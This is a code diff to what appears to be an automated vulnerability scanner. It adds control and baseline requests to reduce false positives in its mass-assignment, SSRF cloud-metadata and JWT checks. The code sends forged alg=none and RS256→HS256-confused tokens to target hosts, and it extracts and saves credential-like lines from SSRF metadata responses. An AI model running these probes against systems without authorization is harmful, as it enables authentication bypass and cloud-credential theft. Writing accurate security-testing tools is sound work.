@@ -23,6 +23,7 @@ from vulnforge.utils import (
     _async_urlopen_no_redirect,
     _dedupe_by_host_path,
     _extra_headers_dict,
+    _extract_host,
     _get_urlopener,
     _load_live_hosts,
     _safe_name,
@@ -394,6 +395,21 @@ async def phase_16b_MASSASSIGN(
 
     async def _check_mass_assignment(ep: str) -> List[str]:
         results: List[str] = []
+        control_status: Optional[int] = None
+        control_len = 0
+        try:
+            ctrl_req = urllib.request.Request(
+                ep,
+                data=json.dumps({"__vf_control_field__": True}).encode(),
+                method="POST",
+                headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
+            )
+            control_status, _, ctrl_body = await _async_urlopen(_ma_urlopen, ctrl_req, timeout=8)
+            control_len = len(ctrl_body)
+        except asyncio.CancelledError:
+            raise
+        except Exception:
+            control_status = None
         for field in _MASS_ASSIGN_FIELDS[: _PIPELINE_CFG.sample_endpoints_post]:
             await _throttle_rate()
             val = _MASS_ASSIGN_VALUES.get(field, True)
@@ -405,8 +421,14 @@ async def phase_16b_MASSASSIGN(
                     method="POST",
                     headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
                 )
-                post_status, _, _ = await _async_urlopen(_ma_urlopen, req, timeout=8)
+                post_status, _, post_body = await _async_urlopen(_ma_urlopen, req, timeout=8)
                 if post_status in (200, 201, 302):
+                    if (
+                        control_status is not None
+                        and post_status == control_status
+                        and abs(len(post_body) - control_len) <= max(50, control_len * 0.1)
+                    ):
+                        continue
                     results.append(f"  POST {ep} {{{field}: {json.dumps(val)}}} → {post_status}")
             except asyncio.CancelledError:
                 raise
@@ -416,6 +438,21 @@ async def phase_16b_MASSASSIGN(
 
     async def _check_mass_assignment_put(ep: str) -> List[str]:
         results: List[str] = []
+        control_status: Optional[int] = None
+        control_len = 0
+        try:
+            ctrl_req = urllib.request.Request(
+                ep,
+                data=json.dumps({"__vf_control_field__": True}).encode(),
+                method="PUT",
+                headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
+            )
+            control_status, _, ctrl_body = await _async_urlopen(_ma_urlopen, ctrl_req, timeout=8)
+            control_len = len(ctrl_body)
+        except asyncio.CancelledError:
+            raise
+        except Exception:
+            control_status = None
         for field in _MASS_ASSIGN_FIELDS[: _PIPELINE_CFG.sample_endpoints_post]:
             await _throttle_rate()
             val = _MASS_ASSIGN_VALUES.get(field, True)
@@ -427,8 +464,14 @@ async def phase_16b_MASSASSIGN(
                     method="PUT",
                     headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
                 )
-                put_status, _, _ = await _async_urlopen(_ma_urlopen, req, timeout=8)
+                put_status, _, put_body = await _async_urlopen(_ma_urlopen, req, timeout=8)
                 if put_status in (200, 201, 302):
+                    if (
+                        control_status is not None
+                        and put_status == control_status
+                        and abs(len(put_body) - control_len) <= max(50, control_len * 0.1)
+                    ):
+                        continue
                     results.append(f"  PUT {ep} {{{field}: {json.dumps(val)}}} → {put_status}")
             except asyncio.CancelledError:
                 raise
@@ -700,6 +743,30 @@ async def phase_17_IDOR(
     return {"17-IDOR": str(_out), "count": len(findings)}
 
 
+_SSRF_META_MARKERS = [
+    "ami-id",
+    "instance-id",
+    "instance-id-document",
+    "security-credentials",
+    "accesskeyid",
+    "secretaccesskey",
+    "accountid",
+    "role/",
+    "serviceaccount",
+    "private_key",
+    "client_id",
+    "client_secret",
+    "computeMetadata",
+    "user-data",
+    "userdata",
+    "public-keys",
+    "reservation-id",
+    "access_token",
+    "refresh_token",
+    "token_uri",
+]
+
+
 async def phase_17b_SSRFMETA(
     outdir: Path,
     t: Tools,
@@ -763,6 +830,7 @@ async def phase_17b_SSRFMETA(
         if not qs:
             continue
         for pname in qs:
+            orig_val = qs[pname][0]
             # Only test parameters that look like URL/redirect parameters
             if not any(
                 k in pname.lower()
@@ -791,6 +859,24 @@ async def phase_17b_SSRFMETA(
                 new_qs = urllib.parse.urlencode(test_qs, doseq=True)
                 test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                 try:
+                    ctrl_qs = qs.copy()
+                    ctrl_qs[pname] = [orig_val]
+                    ctrl_qs_enc = urllib.parse.urlencode(ctrl_qs, doseq=True)
+                    ctrl_url = urllib.parse.urlunparse(parsed._replace(query=ctrl_qs_enc))
+                    ctrl_req = urllib.request.Request(
+                        ctrl_url,
+                        headers={"User-Agent": "Mozilla/5.0", **_ss_extra_headers},
+                    )
+                    ctrl_status, _, ctrl_body = await _async_urlopen(
+                        _ss_urlopen, ctrl_req, timeout=15
+                    )
+                    ctrl_text = ctrl_body.decode("utf-8", errors="ignore")
+                except asyncio.CancelledError:
+                    raise
+                except Exception:
+                    ctrl_status = None
+                    ctrl_text = ""
+                try:
                     req = urllib.request.Request(
                         test_url, headers={"User-Agent": "Mozilla/5.0", **_ss_extra_headers}
                     )
@@ -798,29 +884,51 @@ async def phase_17b_SSRFMETA(
                         _ss_urlopen, req, timeout=15
                     )
                     meta_text = meta_body.decode("utf-8", errors="ignore")
+                    # Differential: probe must differ from the original-value control,
+                    # otherwise a generic 200 shell is indistinguishable from metadata
+                    # exfiltration (the main source of false positives here).
+                    is_differential = (
+                        ctrl_status is None or meta_status != ctrl_status or meta_text != ctrl_text
+                    )
+                    meta_markers = [m for m in _SSRF_META_MARKERS if m in meta_text.lower()]
                     # If we got data back that looks like cloud metadata
-                    if meta_status == 200 and len(meta_text) > 20:
-                        findings.append(f"[credential-exfil] {cloud_name} via {test_url}")
-                        findings.append(f"  status={meta_status} body_length={len(meta_text)}")
-                        # Extract sensitive patterns
-                        for secret_pattern in [
-                            "accesskey",
-                            "secretkey",
-                            "token",
-                            "password",
-                            "private_key",
-                            "ssh",
-                        ]:
-                            for line in meta_text.splitlines():
-                                if secret_pattern in line.lower():
-                                    findings.append(f"  [secret] {line[:200]}")
-                        # Save full response for evidence
-                        meta_out = ensure(
-                            outdir
-                            / "ssrf_meta_raw"
-                            / f"{_safe_name(cloud_name)}_{_safe_name(pname)}.txt"
-                        )
-                        meta_out.write_text(meta_text)
+                    if meta_status == 200 and len(meta_text) > 20 and is_differential:
+                        if meta_markers or any(
+                            secret_pattern in meta_text.lower()
+                            for secret_pattern in [
+                                "accesskey",
+                                "secretkey",
+                                "private_key",
+                                "token",
+                            ]
+                        ):
+                            findings.append(f"[credential-exfil] {cloud_name} via {test_url}")
+                            findings.append(
+                                f"  status={meta_status} body_length={len(meta_text)} markers={','.join(meta_markers[:5])}"
+                            )
+                            # Extract sensitive patterns
+                            for secret_pattern in [
+                                "accesskey",
+                                "secretkey",
+                                "token",
+                                "password",
+                                "private_key",
+                                "ssh",
+                            ]:
+                                for line in meta_text.splitlines():
+                                    if secret_pattern in line.lower():
+                                        findings.append(f"  [secret] {line[:200]}")
+                            # Save full response for evidence
+                            meta_out = ensure(
+                                outdir
+                                / "ssrf_meta_raw"
+                                / f"{_safe_name(cloud_name)}_{_safe_name(pname)}.txt"
+                            )
+                            meta_out.write_text(meta_text)
+                        elif len(meta_text) > 200:
+                            findings.append(
+                                f"[possible-ssrf-meta] {cloud_name} via {test_url} — HTTP {meta_status} len={len(meta_text)} differs from control (check manually)"
+                            )
                 except asyncio.CancelledError:
                     raise
                 except Exception:
@@ -863,7 +971,7 @@ async def _jwt_acceptance_verdict(
     base_headers: Dict[str, str],
     token: str,
     timeout: int = 10,
-) -> Tuple[Optional[int], Optional[int], str, str]:
+) -> Tuple[Optional[int], Optional[int], Optional[int], str, str, str]:
     try:
         base_req = urllib.request.Request(url, method="GET", headers=base_headers)
         bs, _, bb = await _async_urlopen(urlopen, base_req, timeout=timeout)
@@ -875,6 +983,21 @@ async def _jwt_acceptance_verdict(
     except Exception:
         bs = None
         bb = b""
+    try:
+        garbage_req = urllib.request.Request(
+            url,
+            method="GET",
+            headers={**base_headers, "Authorization": "Bearer not.a.real.token"},
+        )
+        gs, _, gb = await _async_urlopen(urlopen, garbage_req, timeout=timeout)
+    except urllib.error.HTTPError as e:
+        gs = e.code
+        gb = e.read()
+    except asyncio.CancelledError:
+        raise
+    except Exception:
+        gs = None
+        gb = b""
     forge_req = urllib.request.Request(
         url,
         method="GET",
@@ -890,39 +1013,50 @@ async def _jwt_acceptance_verdict(
     return (
         fs,
         bs,
+        gs,
         fb.decode("utf-8", errors="ignore").lower(),
         bb.decode("utf-8", errors="ignore").lower(),
+        gb.decode("utf-8", errors="ignore").lower(),
     )
 
 
 def _jwt_forge_accepted(
     forged_status: Optional[int],
     baseline_status: Optional[int],
+    garbage_status: Optional[int],
     forged_body: str,
     baseline_body: str,
+    garbage_body: str,
 ) -> bool:
     if baseline_status is None:
         return False
+    if garbage_status is not None and garbage_status == forged_status:
+        return False
     forged_markers = any(kw in forged_body for kw in _JWT_AUTH_MARKERS)
     baseline_markers = any(kw in baseline_body for kw in _JWT_AUTH_MARKERS)
+    garbage_markers = any(kw in garbage_body for kw in _JWT_AUTH_MARKERS)
     if forged_status in (200, 201) and baseline_status in (401, 403):
         return True
-    return forged_markers and not baseline_markers
+    return forged_markers and not baseline_markers and not garbage_markers
 
 
 def _jwt_forge_candidate(
     forged_status: Optional[int],
     baseline_status: Optional[int],
+    garbage_status: Optional[int],
     forged_body: str,
     baseline_body: str,
+    garbage_body: str,
 ) -> bool:
     if forged_status not in (200, 201):
+        return False
+    if garbage_status is not None and garbage_status == forged_status:
         return False
     if baseline_status is None:
         return True
     if forged_status != baseline_status:
         return True
-    return forged_body != baseline_body
+    return forged_body != baseline_body and forged_body != garbage_body
 
 
 def _b64url_decode(v: str) -> bytes:
@@ -1006,7 +1140,7 @@ async def phase_24_JWT(
     hosts_file = outdir / "host_targets.txt"
     if not hosts_file.exists():
         hosts_file = outdir / "hosts.txt"
-    targets = [f"https://{h}" if not h.startswith("http") else h for h in read_lines(hosts_file)][
+    targets = [f"https://{_extract_host(h)}" for h in read_lines(hosts_file)][
         : _PIPELINE_CFG.sample_hosts_jwt
     ]
     if not targets:
@@ -1117,19 +1251,30 @@ async def phase_24_JWT(
                                 f"[jwt-alg-none-forge] {url} — forged alg=none token: {forged_token[:80]}..."
                             )
                             # Test if server accepts the forged token against a no-token baseline
-                            fs, fs_base, forge_body, base_body = await _jwt_acceptance_verdict(
+                            (
+                                fs,
+                                fs_base,
+                                fs_garbage,
+                                forge_body,
+                                base_body,
+                                garbage_body,
+                            ) = await _jwt_acceptance_verdict(
                                 _j_urlopen,
                                 url,
                                 {"User-Agent": "Mozilla/5.0", **_jwt_extra_headers},
                                 forged_token,
                             )
-                            if _jwt_forge_accepted(fs, fs_base, forge_body, base_body):
+                            if _jwt_forge_accepted(
+                                fs, fs_base, fs_garbage, forge_body, base_body, garbage_body
+                            ):
                                 results.append(
-                                    f"[jwt-critical-alg-none] {url} — server ACCEPTS alg=none forged token! HTTP {fs} (baseline={fs_base})"
+                                    f"[jwt-critical-alg-none] {url} — server ACCEPTS alg=none forged token! HTTP {fs} (baseline={fs_base}, garbage={fs_garbage})"
                                 )
-                            elif _jwt_forge_candidate(fs, fs_base, forge_body, base_body):
+                            elif _jwt_forge_candidate(
+                                fs, fs_base, fs_garbage, forge_body, base_body, garbage_body
+                            ):
                                 results.append(
-                                    f"[jwt-possible-alg-none] {url} — forged alg=none token returned HTTP {fs} (baseline={fs_base}) (check manually)"
+                                    f"[jwt-possible-alg-none] {url} — forged alg=none token returned HTTP {fs} (baseline={fs_base}, garbage={fs_garbage}) (check manually)"
                                 )
                         except asyncio.CancelledError:
                             raise
@@ -1140,8 +1285,13 @@ async def phase_24_JWT(
                         try:
                             import hmac as _hmac
 
-                            # Use the token's header b64 as the "public key" (simplified test)
-                            pk_as_secret = header_b64.encode()
+                            public_key_pem = await _jwt_fetch_public_key(_j_urlopen, url)
+                            if not public_key_pem:
+                                results.append(
+                                    f"[jwt-alg-confusion-skip] {url} — no public key available for RS256→HS256 test"
+                                )
+                                raise Exception("no public key")
+                            pk_as_secret = public_key_pem.encode()
                             hs_token = _hmac.new(
                                 pk_as_secret,
                                 (parts[0] + "." + parts[1]).encode(),
@@ -1150,7 +1300,7 @@ async def phase_24_JWT(
                             hs_b64 = base64.urlsafe_b64encode(hs_token).rstrip(b"=").decode()
                             confused_token = f"{parts[0]}.{parts[1]}.{hs_b64}"
                             results.append(
-                                f"[jwt-alg-confusion-exploit] {url} — RS256→HS256 confused token: {confused_token[:80]}..."
+                                f"[jwt-alg-confusion-exploit] {url} — RS256→HS256 confused token (key from JWKS): {confused_token[:80]}..."
                             )
                             try:
                                 confuse_req = urllib.request.Request(
@@ -1933,7 +2083,7 @@ async def phase_39_OAUTH(
     hosts_file = outdir / "host_targets.txt"
     if not hosts_file.exists():
         hosts_file = outdir / "hosts.txt"
-    hosts = [f"https://{h}" if not h.startswith("http") else h for h in read_lines(hosts_file)][
+    hosts = [f"https://{_extract_host(h)}" for h in read_lines(hosts_file)][
         : _PIPELINE_CFG.sample_hosts_jwt
     ]
     if not hosts:
@@ -2152,7 +2302,7 @@ async def phase_40_PWRESET(
     hosts_file = outdir / "host_targets.txt"
     if not hosts_file.exists():
         hosts_file = outdir / "hosts.txt"
-    hosts = [f"https://{h}" if not h.startswith("http") else h for h in read_lines(hosts_file)][
+    hosts = [f"https://{_extract_host(h)}" for h in read_lines(hosts_file)][
         : _PIPELINE_CFG.sample_hosts_jwt
     ]
     if not hosts:
@@ -2292,7 +2442,7 @@ async def phase_61_OAUTH_ADV(
         log("warn", "61-OAUTH-ADV: no hosts; skipping")
         return {"61-OAUTH-ADV": str(_out), "count": 0}
     for host in hosts[:10]:
-        host_clean = host.split(":")[0].strip()
+        host_clean = _extract_host(host)
         if not host_clean:
             continue
         for scheme in ("https://",):
@@ -2352,7 +2502,7 @@ async def phase_61_OAUTH_ADV(
 
     # Device authorization grant probe
     for host in hosts[:3]:
-        host_clean = host.split(":")[0].strip()
+        host_clean = _extract_host(host)
         for dev_ep in ["/device", "/oauth/device", "/oauth2/device", "/device/code"]:
             dev_url = f"https://{host_clean}{dev_ep}"
             try:
